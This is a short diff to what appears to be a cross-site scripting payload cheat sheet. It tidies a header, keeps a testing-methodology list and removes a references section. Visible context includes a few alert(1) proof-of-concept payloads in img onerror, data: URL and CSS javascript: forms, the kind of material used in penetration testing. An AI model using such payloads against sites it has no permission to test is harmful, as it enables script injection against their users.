@@ -1,7 +1,5 @@
 =================== XSS PAYLOADS COMPREHENSIVE LIST 2025 ===================
-
-
-==================== TESTING METHODOLOGY ====================
+======================== TESTING METHODOLOGY ========================
 
 1. Identify input points (forms, URL parameters, headers)
 2. Test with basic payload: <img src=x onerror=alert(1)>
@@ -311,14 +309,6 @@ data:text/html,<script>alert(1)</script>
 
 CSS Context:
 background:url("javascript:alert(1)")
-
-==================== REFERENCES AND RESOURCES ====================
-
-PortSwigger XSS Cheat Sheet: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
-OWASP XSS Prevention: https://owasp.org/www-community/attacks/xss/
-PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
-HackTricks XSS: https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting
-XSS-Payloads: http://www.xss-payloads.com
 
 
 
